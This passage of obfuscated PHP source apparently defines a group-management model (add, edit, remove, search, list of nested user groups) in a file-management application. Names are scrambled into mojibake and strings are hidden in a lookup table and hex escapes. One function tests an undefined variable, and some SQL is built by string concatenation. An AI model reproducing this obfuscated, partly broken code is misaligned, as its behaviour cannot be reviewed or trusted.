Model($ŸÅ·÷É[1326])->where($‡ğ´ã«)->count(); $¾’®Ğ² = Model($ŸÅ·÷É[1899])->where($‡ğ´ã«)->count(); $©ÖÖÍ = intval($í€×›©é) + intval($¾’®Ğ²); if ($©ÖÖÍ == 0) { IO::remove($ò‘°ü¹ [$ŸÅ·÷É[94]]); Model($ŸÅ·÷É[1900])->delete($ò‘°ü¹ [$ŸÅ·÷É[477]]); $this->where($‡ğ´ã«)->delete(); $this->metaSet($ò‘°ü¹ [$ŸÅ·÷É[477]], null, null); return; } if ($ò‘°ü¹ [$ŸÅ·÷É[1895]] != $©ÖÖÍ) { $this->where($‡ğ´ã«)->save(array($ŸÅ·÷É[1888] => $©ÖÖÍ)); } } public function storageInfo($Â±Ã‡±¼ = false) { $¾ãÄÆ¼ =& $_SERVER[„Ç©ñÎ©]; $¡Îİ×øß = $this->count() + 0.0; $¥ŞêÈå× = 0; $µ†ğĞî = 1; $ÆÆµ°·÷ = 0; $åÀÓçÎ‚ = 5000; for ($Á´Ş»šî = 0; $Á´Ş»šî < $¡Îİ×øß; $Á´Ş»šî = $Á´Ş»šî + $åÀÓçÎ‚) { $êÍÑô = $this->limit($Á´Ş»šî, $Á´Ş»šî + $åÀÓçÎ‚)->select(); foreach ($êÍÑô as $ÂØ¹Œ¤á) { $µ†ğĞî += $ÂØ¹Œ¤á[$¾ãÄÆ¼[86]] * $ÂØ¹Œ¤á[$¾ãÄÆ¼[1895]]; $¥ŞêÈå× += $ÂØ¹Œ¤á[$¾ãÄÆ¼[86]] * ($ÂØ¹Œ¤á[$¾ãÄÆ¼[1895]] - 1); $ÆÆµ°·÷ += $ÂØ¹Œ¤á[$¾ãÄÆ¼[1895]]; } } $ÄªÒŞÒ¶ = array($¾ãÄÆ¼[1901] => $µ†ğĞî, $¾ãÄÆ¼[1902] => $¥ŞêÈå×, $¾ãÄÆ¼[1903] => $¥ŞêÈå× / $µ†ğĞî, $¾ãÄÆ¼[90] => $¡Îİ×øß, $¾ãÄÆ¼[1904] => $ÆÆµ°·÷); return $ÄªÒŞÒ¶; } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\157\165\160"; protected $tableMeta = array("\164\x61\x62\154\x65\116\141\x6d\x65" => "\147\x72\157\x75\160\x5f\x6d\145\164\x61", "\x6d\x65\164\141\106\151\x65\154\144" => "\147\162\157\x75\x70\x49\104"); protected function cacheFunctionAlias($ÁÃğÆÍØ) { $Û‰ø§¡§ =& $_SERVER[„Ç©ñÎ©]; return array($Û‰ø§¡§[1905] => array($ÁÃğÆÍØ[0], $Û‰ø§¡§[1906]), $Û‰ø§¡§[1907] => array($ÁÃğÆÍØ[0], $Û‰ø§¡§[1908])); } protected function getInfo($¿ÅÉ²Àç, $µ«… · = false) { $àÓ­Õ”Ş = $this->getInfoSimple($¿ÅÉ²Àç); if (!$àÓ­Õ”Ş) { return !1; } if ($µ«… ·) { return $this->_listDataApplyItem($àÓ­Õ”Ş); } return $this->cacheFunctionGet($_SERVER[„Ç©ñÎ©][1909], $¿ÅÉ²Àç); } protected function getInfoSimple($Ÿ‘«ñÈ§, $Š²óÚ±• = false) { $å²¤û´… =& $_SERVER[„Ç©ñÎ©]; if ($Š²óÚ±•) { $ØÖû˜ÃŸ = array($å²¤û´…[1827] => intval($Ÿ‘«ñÈ§)); $²ÂŞÍÓ = $this->where($ØÖû˜ÃŸ)->find(); return is_array($²ÂŞÍÓ) ? $²ÂŞÍÓ : array(); } return $this->cacheFunctionGet($å²¤û´…[1910], $Ÿ‘«ñÈ§); } protected function groupAdd($ğ¬Ù‹À‡) { $Ûê‰ïà± =& $_SERVER[„Ç©ñÎ©]; if (!$ğ¬Ù‹À‡[$Ûê‰ïà±[441]] && isset($ğ¬Ù‹À‡[$Ûê‰ïà±[1827]]) && $ğ¬Ù‹À‡[$Ûê‰ïà±[1827]] == 1) { if ($’ô¸¸ı = $this->getInfoSimple($ğ¬Ù‹À‡[$Ûê‰ïà±[1827]], !0)) { return $ğ¬Ù‹À‡[$Ûê‰ïà±[1827]]; } } else { $’ô¸¸ı = $this->getInfoSimple($ğ¬Ù‹À‡[$Ûê‰ïà±[441]]); if (!$’ô¸¸ı) { return !1; } } $¬û¢ü = $Ûê‰ïà±[540]; if ($’ô¸¸ı[$Ûê‰ïà±[530]]) { $¬û¢ü = $’ô¸¸ı[$Ûê‰ïà±[530]] . $’ô¸¸ı[$Ûê‰ïà±[1827]] . $Ûê‰ïà±[50]; } $¢®Ô©¬± = array($Ûê‰ïà±[429] => $this->groupNameAuto($ğ¬Ù‹À‡[$Ûê‰ïà±[441]], $ğ¬Ù‹À‡[$Ûê‰ïà±[32]]), $Ûê‰ïà±[410] => $ğ¬Ù‹À‡[$Ûê‰ïà±[441]], $Ûê‰ïà±[599] => $¬û¢ü, $Ûê‰ïà±[1911] => $ğ¬Ù‹À‡[$Ûê‰ïà±[1814]], $Ûê‰ïà±[1912] => 0, $Ûê‰ïà±[1831] => 0); if (isset($ğ¬Ù‹À‡[$Ûê‰ïà±[1851]])) { $¢®Ô©¬±[$Ûê‰ïà±[1851]] = $ğ¬Ù‹À‡[$Ûê‰ïà±[1851]]; } else { $¨÷ğĞ‚Š = $this->max($Ûê‰ïà±[1851]); if (!$¨÷ğĞ‚Š) { $¨÷ğĞ‚Š = 0; } $¢®Ô©¬±[$Ûê‰ïà±[1851]] = $¨÷ğĞ‚Š + 1; } if (!empty($ğ¬Ù‹À‡[$Ûê‰ïà±[1827]])) { $¢®Ô©¬±[$Ûê‰ïà±[1827]] = $ğ¬Ù‹À‡[$Ûê‰ïà±[1827]]; } $ÒÚŸîÈÛ = $this->add($¢®Ô©¬±); $this->setNamePinyin($ÒÚŸîÈÛ, $¢®Ô©¬±[$Ûê‰ïà±[32]]); if (isset($ğ¬Ù‹À‡[$Ûê‰ïà±[1913]])) { $this->metaSet($ÒÚŸîÈÛ, array($Ûê‰ïà±[1913] => $ğ¬Ù‹À‡[$Ûê‰ïà±[1913]], $Ûê‰ïà±[1914] => $ğ¬Ù‹À‡[$Ûê‰ïà±[1914]])); unset($ğ¬Ù‹À‡[$Ûê‰ïà±[1913]]); unset($ğ¬Ù‹À‡[$Ûê‰ïà±[1914]]); } Model($Ûê‰ïà±[1326])->groupRootAdd($ÒÚŸîÈÛ); return $ÒÚŸîÈÛ; } protected function groupEdit($–£È‘Šò, $Í’ù™È) { $Âş•°Öó =& $_SERVER[„Ç©ñÎ©]; $ùôŞı´Ô = $this->getInfoSimple($–£È‘Šò); if (!$ùôŞı´Ô) { return !1; } if (!empty($Í’ù™È[$Âş•°Öó[441]])) { $šò×µ = $this->getInfoSimple($Í’ù™È[$Âş•°Öó[441]]); if (!$šò×µ) { return !1; } if ($ùôŞı´Ô[$Âş•°Öó[1827]] == $šò×µ[$Âş•°Öó[1827]]) { return !1; } if ($Í’ù™È[$Âş•°Öó[441]] != $ùôŞı´Ô[$Âş•°Öó[441]]) { if ($šò×µ[$Âş•°Öó[530]] !== $ùôŞı´Ô[$Âş•°Öó[530]] && strpos($šò×µ[$Âş•°Öó[530]], $ùôŞı´Ô[$Âş•°Öó[530]] . $ùôŞı´Ô[$Âş•°Öó[1827]] . $Âş•°Öó[50]) === 0) { return !1; } $Í’ù™È[$Âş•°Öó[599]] = $šò×µ[$Âş•°Öó[530]] . $Í’ù™È[$Âş•°Öó[441]] . $Âş•°Öó[50]; $this->_changeChildLevel($ùôŞı´Ô, $šò×µ); } } if (isset($Í’ù™È[$Âş•°Öó[32]])) { $this->setNamePinyin($–£È‘Šò, $Í’ù™È[$Âş•°Öó[32]]); } if (isset($Í’ù™È[$Âş•°Öó[1913]])) { $this->metaSet($–£È‘Šò, array($Âş•°Öó[1913] => $Í’ù™È[$Âş•°Öó[1913]], $Âş•°Öó[1914] => $Í’ù™È[$Âş•°Öó[1914]])); unset($Í’ù™È[$Âş•°Öó[1913]]); unset($Í’ù™È[$Âş•°Öó[1914]]); } $this->_clearChildrenCache($ùôŞı´Ô); return $this->where(array($Âş•°Öó[1915] => $–£È‘Šò))->save($Í’ù™È); } private function _clearChildrenCache($±ÃÄ±) { $÷“€Ñö  =& $_SERVER[„Ç©ñÎ©]; $÷¼áØêß = array($÷“€Ñö [599] => array($÷“€Ñö [559], $±ÃÄ±[$÷“€Ñö [530]] . $±ÃÄ±[$÷“€Ñö [1827]] . $÷“€Ñö [560])); $úú°Ìšé = $this->field($÷“€Ñö [1827])->where($÷¼áØêß)->select(); foreach ($úú°Ìšé as $„ƒñÈéÓ) { $this->_clearCache($„ƒñÈéÓ[$÷“€Ñö [1827]]); } } private function _clearCache($¹ë’†Ñİ) { $‡š¥í³¾ =& $_SERVER[„Ç©ñÎ©]; $this->cacheFunctionClear($‡š¥í³¾[1909], $¹ë’†Ñİ); $this->cacheFunctionClear($‡š¥í³¾[1910], $¹ë’†Ñİ); } private function _changeChildLevel($ÖºŞ£ßı, $™ü»©õû, $ìÀôß§Ğ = false) { $ßäÛêúé =& $_SERVER[„Ç©ñÎ©]; $İéÈœóÔ = $ÖºŞ£ßı[$ßäÛêúé[530]] . $ÖºŞ£ßı[$ßäÛêúé[1827]] . $ßäÛêúé[50]; $úôêó™ = $™ü»©õû[$ßäÛêúé[530]] . $™ü»©õû[$ßäÛêúé[1827]] . $ßäÛêúé[50] . $ÖºŞ£ßı[$ßäÛêúé[1827]] . $ßäÛêúé[50]; if ($ìÀôß§Ğ) { $úôêó™ = $™ü»©õû[$ßäÛêúé[530]] . $™ü»©õû[$ßäÛêúé[1827]] . $ßäÛêúé[50]; } $»Ğ³ ®„ = array($ßäÛêúé[599] => array($ßäÛêúé[559], $ÖºŞ£ßı[$ßäÛêúé[530]] . $ÖºŞ£ßı[$ßäÛêúé[1827]] . $ßäÛêúé[560])); $•Š˜‹‘ = array($ßäÛêúé[599] => array($ßäÛêúé[608], "\162\x65\160\x6c\141\x63\145\x28\160\x61\x72\x65\x6e\164\x4c\145\x76\145\154\54\47{$İéÈœóÔ}\x27\54\x27{$úôêó™}\47\x29")); $this->_clearChildrenCache($ÖºŞ£ßı); $this->where($»Ğ³ ®„)->data($•Š˜‹‘)->save(); } public function setNamePinyin($“Ÿ—åèÛ, $Ÿ­œÓ¥ = false) { $õÚØè…â =& $_SERVER[„Ç©ñÎ©]; if (!$Ÿ­œÓ¥) { $¬«ø‘ä… = $this->getInfoSimple($“Ÿ—åèÛ); $Ÿ­œÓ¥ = $¬«ø‘ä…[$õÚØè…â[32]]; } if (!Input::check($Ÿ­œÓ¥, $õÚØè…â[602])) { $this->metaSet($“Ÿ—åèÛ, $õÚØè…â[474], null); $this->metaSet($“Ÿ—åèÛ, $õÚØè…â[473], null); return; } $Ò†»­Ø = array($õÚØè…â[474] => str_replace($õÚØè…â[53], $õÚØè…â[12], Pinyin::get($Ÿ­œÓ¥)), $õÚØè…â[473] => Pinyin::get($Ÿ­œÓ¥, $õÚØè…â[603])); $this->metaSet($“Ÿ—åèÛ, $Ò†»­Ø); } protected function groupStatus($Î‹Í´Ÿ‘, $°ë—€ŸÔ) { $ÄÄ¾ñß =& $_SERVER[„Ç©ñÎ©]; $·­ÒÌ¥« = $this->getInfoSimple($Î‹Í´Ÿ‘); if (!$·­ÒÌ¥«) { return !1; } if ($°ë—€ŸÔ == $ÄÄ¾ñß[98]) { $ú¸âø™ = $this->parentLevelArray($·­ÒÌ¥«[$ÄÄ¾ñß[530]]); } else { $®ãâ‘¥À = array($ÄÄ¾ñß[599] => array($ÄÄ¾ñß[559], $·­ÒÌ¥«[$ÄÄ¾ñß[530]] . $·­ÒÌ¥«[$ÄÄ¾ñß[1827]] . $ÄÄ¾ñß[560])); $ú¸âø™ = $this->where($®ãâ‘¥À)->field($ÄÄ¾ñß[1827])->select(); $ú¸âø™ = array_to_keyvalue($ú¸âø™, $ÄÄ¾ñß[12], $ÄÄ¾ñß[1827]); } $ú¸âø™[] = $·­ÒÌ¥«[$ÄÄ¾ñß[1827]]; $Âù÷Œ˜  = array(); foreach ($ú¸âø™ as $Î‹Í´Ÿ‘) { $Âù÷Œ˜ [] = array($ÄÄ¾ñß[1827] => $Î‹Í´Ÿ‘, $ÄÄ¾ñß[104] => $ÄÄ¾ñß[753], $ÄÄ¾ñß[383] => $°ë—€ŸÔ); $this->_clearCache($Î‹Í´Ÿ‘); } return Model($ÄÄ¾ñß[1916])->addAll($Âù÷Œ˜ , array(), !0); } protected function groupRemove($ÍÃŸÉ»Ò, $šÃ¢©âà = false) { $´Ñ˜êë =& $_SERVER[„Ç©ñÎ©]; $ø•ˆ°èÛ = array($´Ñ˜êë[1827] => $ÍÃŸÉ»Ò); $Á‘×ğÄ = $this->where($ø•ˆ°èÛ)->find(); if (!$Á‘×ğÄ || $Á‘×ğÄ[$´Ñ˜êë[441]] == 0) { return !1; } if (!$šÃ¢©âà) { $Ò› »Î = $this->getInfoSimple($Á‘×ğÄ[$´Ñ˜êë[441]]); $this->_changeChildLevel($Á‘×ğÄ, $Ò› »Î, !0); $this->where(array($´Ñ˜êë[441] => $ÍÃŸÉ»Ò))->save(array($´Ñ˜êë[441] => $Á‘×ğÄ[$´Ñ˜êë[441]])); } Model($´Ñ˜êë[1916])->where($ø•ˆ°èÛ)->delete(); Model($´Ñ˜êë[1917])->where($ø•ˆ°èÛ)->delete(); Model($´Ñ˜êë[828])->groupRootRemove($ÍÃŸÉ»Ò); return $this->where($ø•ˆ°èÛ)->delete(); } protected function groupSort($ŞŒ—Åü) { $­²¾øƒª =& $_SERVER[„Ç©ñÎ©]; $°¼¿ÓÎü = array(); foreach ($ŞŒ—Åü as $ÚØ¤½âæ => $–¸™ƒâÛ) { $°¼¿ÓÎü[] = array($­²¾øƒª[1827], $–¸™ƒâÛ, $­²¾øƒª[1851], $ÚØ¤½âæ + 1); } $this->saveAll($°¼¿ÓÎü); } public function listData() { $Å°Û¸€ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Å°Û¸€[$_SERVER[„Ç©ñÎ©][378]]); return $Å°Û¸€; } private function _makeOrder($ÕºÍ = '') { $Ï˜·ï¼ =& $_SERVER[„Ç©ñÎ©]; $™ö şè = array($Ï˜·ï¼[1827], $Ï˜·ï¼[32], $Ï˜·ï¼[1816], $Ï˜·ï¼[210]); $óæúÍ÷Á = array($Ï˜·ï¼[459] => $Ï˜·ï¼[460], $Ï˜·ï¼[461] => $Ï˜·ï¼[462]); $è¸Ù“Ÿ = Input::get($Ï˜·ï¼[466], $Ï˜·ï¼[7], $Ï˜·ï¼[1831], $™ö şè); $Ú‹¡Î = Input::get($Ï˜·ï¼[467], $Ï˜·ï¼[7], $Ï˜·ï¼[1918], array($Ï˜·ï¼[1918], $Ï˜·ï¼[461])); $Ú‹¡Î = $óæúÍ÷Á[$Ú‹¡Î]; $ÕºÍ = $ÕºÍ . "{$è¸Ù“Ÿ}\40{$Ú‹¡Î}\54\40\147\x72\x6f\165\x70\111\x44\x20\141\163\x63"; return $this->order($ÕºÍ); } public function listChild($ÙãÓ–¦Ù) { $…×¶Šä =& $_SERVER[„Ç©ñÎ©]; $Õ×Ô“¦ê = $this->where(array($…×¶Šä[441] => $ÙãÓ–¦Ù))->_makeOrder()->selectPage(200); $this->_listDataApply($Õ×Ô“¦ê[$…×¶Šä[378]]); return $Õ×Ô“¦ê; } public function listChildIds($ıŒ•ƒäø) { $ÎŒóÑ¢‡ =& $_SERVER[„Ç©ñÎ©]; if (is_string($×ë§•÷)) { $ıŒ•ƒäø = explode($ÎŒóÑ¢‡[50], $ıŒ•ƒäø); } $¯õñÒË = $this->where(array($ÎŒóÑ¢‡[1827] => array($ÎŒóÑ¢‡[7], $ıŒ•ƒäø)))->field($ÎŒóÑ¢‡[1919])->select(); if (!$¯õñÒË) { return !1; } $ˆßñˆéğ = array(); foreach ($¯õñÒË as $­éÊ˜¯) { $ˆßñˆéğ[] = "\x73\145\154\145\x63\164\40\147\x72\x6f\165\160\111\104\40\x66\162\157\x6d\x20\x60\147\162\157\165\160\140\40\x77\150\x65\x72\145\40\160\x61\162\145\x6e\x74\x4c\x65\x76\145\x6c\40\x6c\x69\153\145\x20\47{$­éÊ˜¯[$ÎŒóÑ¢‡[530]]}{$­éÊ˜¯[$ÎŒóÑ¢‡[1827]]}\54\45\x27"; } $ˆßñˆéğ = implode($ÎŒóÑ¢‡[1920], $ˆßñˆéğ); $¯õñÒË = $this->query($ˆßñˆéğ); if (!$¯õñÒË) { return array(); } $ıŒ•ƒäø = array_to_keyvalue($¯õñÒË, $ÎŒóÑ¢‡[12], $ÎŒóÑ¢‡[1827]); return array_unique($ıŒ•ƒäø); } public function listByID($—×®ğÈä) { $…¯•°¥ =& $_SERVER[„Ç©ñÎ©]; if (!$—×®ğÈä) { return array(); } $Ë˜ææªİ = array($…¯•°¥[1827] => array($…¯•°¥[7], $—×®ğÈä)); $ú”åí€ì = $this->where($Ë˜ææªİ)->select(); $ú”åí€ì = array_sort_keep($ú”åí€ì, $…¯•°¥[1827], $—×®ğÈä); $this->_listDataApply($ú”åí€ì); return $ú”åí€ì; } public function listSearch($èÉñ–ƒÙ) { $÷©àòØû =& $_SERVER[„Ç©ñÎ©]; $èØüÉö· = $èÉñ–ƒÙ[$÷©àòØû[1921]]; $Ì¥¤²Î = isset($èÉñ–ƒÙ[$÷©àòØû[1922]]) ? $èÉñ–ƒÙ[$÷©àòØû[1922]] : !1; if (!trim($èØüÉö·)) { return !1; } $èØüÉö· = str_replace($÷©àòØû[1923], $÷©àòØû[1924], $èØüÉö·); $À™âû’© = array($÷©àòØû[1827] => array($÷©àòØû[392], "{$èØüÉö·}\x25"), $÷©àòØû[32] => array($÷©àòØû[392], "\45{$èØüÉö·}\x25"), $÷©àòØû[999] => $÷©àòØû[1925]); if ($Ì¥¤²Î) { $–Êù—Ù = $this->getInfoSimple($Ì¥¤²Î); $ÛÒ¥¨ô¶ = $–Êù—Ù[$÷©àòØû[530]] . $Ì¥¤²Î . $÷©àòØû[560]; $À™âû’© = array($À™âû’©, array($÷©àòØû[530] => array($÷©àòØû[392], $ÛÒ¥¨ô¶))); } $À™âû’© = $this->parseWhereLike($À™âû’©); $ëìò™êŠ = $this->_makeOrder()->where($À™âû’©)->selectPage(20); $ëìò™êŠ = $ëìò™êŠ ? $ëìò™êŠ : array($÷©àòØû[378] => array(), $÷©àòØû[375] => array()); if (!$ëìò™êŠ || count($ëìò™êŠ[$÷©àòØû[378]]) < 5 && Input::check($èØüÉö·, $÷©àòØû[327])) { $€ªàºõË = $this->groupChildrenAll($Ì¥¤²Î); $»¬¿úØ¸ = $this->_searchFromMeta($÷©àòØû[473], $èØüÉö·, 10, $€ªàºõË); $»º÷† = $this->_searchFromMeta($÷©àòØû[474], $èØüÉö·, 10, $€ªàºõË); $¸‹ª½§ = array_merge($»¬¿úØ¸, $»º÷†, $ëìò™êŠ[$÷©àòØû[378]]); $ëìò™êŠ[$÷©àòØû[378]] = array_unique_by_key($¸‹ª½§, $÷©àòØû[1827]); $ëìò™êŠ[$÷©àòØû[375]][$÷©àòØû[376]] = count($ëìò™êŠ[$÷©àòØû[378]]); $ëìò™êŠ[$÷©àòØû[375]][$÷©àòØû[377]] = ceil($ëìò™êŠ[$÷©àòØû[375]][$÷©àòØû[376]] / $ëìò™êŠ[$÷©àòØû[375]][$÷©àòØû[372]]); } $this->_listDataApply($ëìò™êŠ[$÷©àòØû[378]]); return $ëìò™êŠ; } protected function groupChildrenAll($ÂŸö©ÊØ) { $²í´—ë• =& $_SERVER[„Ç©ñÎ©]; if (!$ÂŸö©ÊØ) { return !1; } if (is_string($ÂŸö©ÊØ)) { $ÂŸö©ÊØ = array($ÂŸö©ÊØ); } $ÑÅ„¥”Û = $ÂŸö©ÊØ; foreach ($ÂŸö©ÊØ as $Á¬şö‘) { $øÙ¤ÊšÚ = $this->getInfoSimple($Á¬şö‘); $¼õ¸ùë½ = array($²í´—ë•[530] => array($²í´—ë•[392], $øÙ¤ÊšÚ[$²í´—ë•[530]] . $Á¬şö‘ . $²í´—ë•[560])); $÷Êôíİ = $this->field($²í´—ë•[1827])->where($¼õ¸ùë½)->select(); $ÑÅ„¥”Û = array_merge($ÑÅ„¥”Û, array_to_keyvalue($÷Êôíİ, $²í´—ë•[12], $²í´—ë•[1827])); } return array_unique($ÑÅ„¥”Û); } private function _searchFromMeta($¼ Ó˜¦å, $‚„”¿à, $Åîï©ê, $³¤©º¥ê) { $×ƒìÃõö =& $_SERVER[„Ç©ñÎ©]; $‚„”¿à = strtolower($‚„”¿à); $ËÔˆÂ± = array($×ƒìÃõö[104] => $¼ Ó˜¦å, $×ƒìÃõö[383] => array($×ƒìÃõö[392], "\45{$‚„”¿à}\x25")); $ËÔˆÂ± = $this->parseWhereLike($ËÔˆÂ±); if ($³¤©º¥ê) { $ËÔˆÂ±[$×ƒìÃõö[1827]] = array($×ƒìÃõö[7], $³¤©º¥ê); } $¿‡Ñ’Ôİ = Model($×ƒìÃõö[1926])->where($ËÔˆÂ±)->limit($Åîï©ê)->select(); if (!$¿‡Ñ’Ôİ) { return array(); } $¿‡Ñ’Ôİ = array_to_keyvalue($¿‡Ñ’Ôİ, $×ƒìÃõö[12], $×ƒìÃõö[1827]); $¶×¯É÷¾ = $this->where(array($×ƒìÃõö[1915] => array($×ƒìÃõö[7], $¿‡Ñ’Ôİ)))->select(); if (!$¶×¯É÷¾) { return array(); } return $¶×¯É÷¾; } protected function _listDataApplyItem($¶È°Ä÷) { $é‚–‰… = array($¶È°Ä÷); $this->_listDataApply($é‚–‰…); return $é‚–‰…[0]; } protected function _listDataApply(&$Üú®Şñ…) { $º‡·¶Ë =& $_SERVER[„Ç©ñÎ©]; if (!$Üú®Şñ…) { return; } $Ç¡‰¾ÔÆ = array_to_keyvalue($Üú®Şñ…, $º‡·¶Ë[12], $º‡·¶Ë[1827]); $this->_listAppendChildren($Üú®Şñ…); $this->_listAppendChildrenMember($Üú®Şñ…); $this->_listAppendMeta($Üú®Şñ…, $Ç¡‰¾ÔÆ); $this->_listAppendParent($Üú®Şñ…); $this->_listAppendSourceRoot($Üú®Şñ…, $Ç¡‰¾ÔÆ); } private function _listAppendChildren(&$ˆÕåî»°) { $Ó‹èã«® =& $_SERVER[„Ç©ñÎ©]; $£ÙÊñ¯ = array_to_keyvalue($ˆÕåî»°, $Ó‹èã«®[12], $Ó‹èã«®[1827]); $‘±ªµ½ = array($Ó‹èã«®[441] => array($Ó‹èã«®[7], $£ÙÊñ¯)); $Óáöö¸™ = array($Ó‹èã«®[441], $Ó‹èã«®[1927] => $Ó‹èã«®[509]); $í‚Â€§¹ = $this->field($Óáöö¸™)->where($‘±ªµ½)->group($Ó‹èã«®[441])->select(); $›ÜÌÊ½ = array_to_keyvalue($í‚Â€§¹, $Ó‹èã«®[441], $Ó‹èã«®[509]); foreach ($ˆÕåî»° as &$›êë‚„¥) { $ááËÙ—› = $›êë‚„¥[$Ó‹èã«®[1827]]; $›êë‚„¥[$Ó‹èã«®[1928]] = isset($›ÜÌÊ½[$ááËÙ—›]) ? intval($›ÜÌÊ½[$ááËÙ—›]) : !1; } unset($›êë‚„¥); } private function _listAppendChildrenMember(&$«ûú‡Ñü) { $ÇçÏ…Ê¾ =& $_SERVER[„Ç©ñÎ©]; $¶œÄÛÃÀ = array_to_keyvalue($«ûú‡Ñü, $ÇçÏ…Ê¾[12], $ÇçÏ…Ê¾[1827]); $ˆ©®½¹Æ = array($ÇçÏ…Ê¾[1827] => array($ÇçÏ…Ê¾[7], $¶œÄÛÃÀ)); $í¨Š¯š¨ = array($ÇçÏ…Ê¾[1827], $ÇçÏ…Ê¾[1927] => $ÇçÏ…Ê¾[509]); $ğöĞ¿Ç = Model($ÇçÏ…Ê¾[1917])->field($í¨Š¯š¨)->where($ˆ©®½¹Æ)->group($ÇçÏ…Ê¾[1827])->select(); $Î¯¢¼Äş = array_to_keyvalue($ğöĞ¿Ç, $ÇçÏ…Ê¾[1827], $ÇçÏ…Ê¾[509]); foreach ($«ûú‡Ñü as &$•€¤Ä§) { $‡úÍ£Úã = $•€¤Ä§[$ÇçÏ…Ê¾[1827]]; $•€¤Ä§[$ÇçÏ…Ê¾[1929]] = isset($Î¯¢¼Äş[$‡úÍ£Úã]) ? intval($Î¯¢¼Äş[$‡úÍ£Úã]) : !1; } unset($•€¤Ä§); } private function _listAppendMeta(&$áº·êùµ, $Ä®ƒÑ”„) { $œ¸­É‚¹ =& $_SERVER[„Ç©ñÎ©]; $©­í’©ì = array($œ¸­É‚¹[1827] => array($œ¸­É‚¹[7], $Ä®ƒÑ”„)); $Í»§ª¥ç = Model($œ¸­É‚¹[1916])->where($©­í’©ì)->select(); $Í»§ª¥ç = array_to_keyvalue_group($Í»§ª¥ç, $œ¸­É‚¹[1827]); foreach ($Í»§ª¥ç as &$¶ÖÚ¸¤Ü) { $¶ÖÚ¸¤Ü = array_to_keyvalue($¶ÖÚ¸¤Ü, $œ¸­É‚¹[104], $œ¸­É‚¹[383]); } unset($¶ÖÚ¸¤Ü); foreach ($áº·êùµ as &$ÌÅØä®ù) { $ÌÅØä®ù[$œ¸­É‚¹[475]] = array(); if (isset($Í»§ª¥ç[$ÌÅØä®ù[$œ¸­É‚¹[1827]]])) { $ÌÅØä®ù[$œ¸­É‚¹[475]] = $Í»§ª¥ç[$ÌÅØä®ù[$œ¸­É‚¹[1827]]]; } } unset($ÌÅØä®ù); } protected function parentLevelArray($ıÒ‡µ˜Â) { $Úâ¨•òş =& $_SERVER[„Ç©ñÎ©]; $ıÒ‡µ˜Â = explode($Úâ¨•òş[50], trim($ıÒ‡µ˜Â, $Úâ¨•òş[50])); $ıÒ‡µ˜Â = array_remove_value($ıÒ‡µ˜Â, $Úâ¨•òş[207]); return $ıÒ‡µ˜Â; } protected function parentInGroup($™ÙöÕğú, $Ì÷•ß“ü) { $Ãúí–Ü  =& $_SERVER[„Ç©ñÎ©]; $Â£‚œº = $this->getInfoSimple($™ÙöÕğú); if (!$Â£‚œº) { return !0; } $˜½ÔŠ¡Œ = $this->parentLevelArray($Â£‚œº[$Ãúí–Ü [530]]); $˜½ÔŠ¡Œ[] = $™ÙöÕğú; foreach ($˜½ÔŠ¡Œ as $™ÙöÕğú) { if (in_array($™ÙöÕğú . $Ãúí–Ü [12], $Ì÷•ß“ü)) { return !0; } } return !1; } private function _listAppendParent(&$éöüÏó¨) { $ßÏ§ªú‡ =& $_SERVER[„Ç©ñÎ©]; $ª“æº˜ = array(); foreach ($éöüÏó¨ as &$—ş®àÅÓ) { $ª“æº˜[$—ş®àÅÓ[$ßÏ§ªú‡[1827]]] = $—ş®àÅÓ[$ßÏ§ªú‡[32]]; $—¶ ¿ÂĞ = $this->parentLevelArray($—ş®àÅÓ[$ßÏ§ªú‡[530]]); foreach ($—¶ ¿ÂĞ as $€ŒçÖşÄ) { if (!isset($ª“æº˜[$€ŒçÖşÄ])) { $ª“æº˜[$€ŒçÖşÄ] = 0; } } } unset($—ş®àÅÓ); foreach ($ª“æº˜ as $ğ¢£ù¼£ => $‚ıà‰´ø) { if ($‚ıà‰´ø) { continue; } $ì¤†Œ÷â = $this->getInfoSimple($ğ¢£ù¼£); $ª“æº˜[$ğ¢£ù¼£] = $ì¤†Œ÷â[$ßÏ§ªú‡[32]]; } $™ùÔµ± = $GLOBALS[$ßÏ§ªú‡[6]][$ßÏ§ªú‡[99]][$ßÏ§ªú‡[1930]]; if ($GLOBALS[$ßÏ§ªú‡[512]] == $ßÏ§ªú‡[98]) { $™ùÔµ± = !1; } foreach ($éöüÏó¨ as &$—ş®àÅÓ) { $—¶ ¿ÂĞ = $this->parentLevelArray($—ş®àÅÓ[$ßÏ§ªú‡[530]]); $Ø™¬†ÙŒ = $ßÏ§ªú‡[12]; foreach ($—¶ ¿ÂĞ as $ğ¢£ù¼£ => $€ŒçÖşÄ) { if ($™ùÔµ± && $ğ¢£ù¼£ == 0) { continue; } $Ø™¬†ÙŒ .= $ª“æº˜[$€ŒçÖşÄ] . $ßÏ§ªú‡[8]; } if ($—¶ ¿ÂĞ) { $Ø™¬†ÙŒ .= $—ş®àÅÓ[$ßÏ§ªú‡[32]]; } $—ş®àÅÓ[$ßÏ§ªú‡[535]] = str_replace($ßÏ§ªú‡[538], $ßÏ§ªú‡[8], $Ø™¬†ÙŒ); } unset($—ş®àÅÓ); } private function _listAppendSourceRoot(&$ìÒ»ßÁË, $éÕÖŸ€) { $¶¸§­úî =& $_SERVER[„Ç©ñÎ©]; $¢Š««“ú = Model($¶¸§­úî[828])->listSourceRoot(SourceModel::TYPE_GROUP, $éÕÖŸ€); $¢Š««“ú = array_to_keyvalue($¢Š««“ú, $¶¸§­úî[514]); $¢Š««“ú = array_remove_key($¢Š««“ú, $¶¸§­úî[514]); foreach ($ìÒ»ßÁË as &$ŸéÛÔı¥) { $ŸéÛÔı¥[$¶¸§­úî[96]] = $¢Š««“ú[$ŸéÛÔı¥[$¶¸§­úî[1827]]] ? $¢Š««“ú[$ŸéÛÔı¥[$¶¸§­úî[1827]]] : array(); } unset($ŸéÛÔı¥); } protected function groupMerge($‚Í—‚ŠÍ) { $‚Í—‚ŠÍ = array_values(array_unique($‚Í—‚ŠÍ)); $õ¯Ğİœû = array(); for ($¿»—·Å¿ = 0; $¿»—·Å¿ < count($‚Í—‚ŠÍ); $¿»—·Å¿++) { $âÏ¤—•¡ = !1; for ($©Ì²æÌæ = 0; $©Ì²æÌæ < count($‚Í—‚ŠÍ); $©Ì²æÌæ++) { if ($¿»—·Å¿ == $©Ì²æÌæ) { continue; } if ($this->isParentOf($‚Í—‚ŠÍ[$©Ì²æÌæ], $‚Í—‚ŠÍ[$¿»—·Å¿])) { $âÏ¤—•¡ = !0; break; } } if (!$âÏ¤—•¡) { 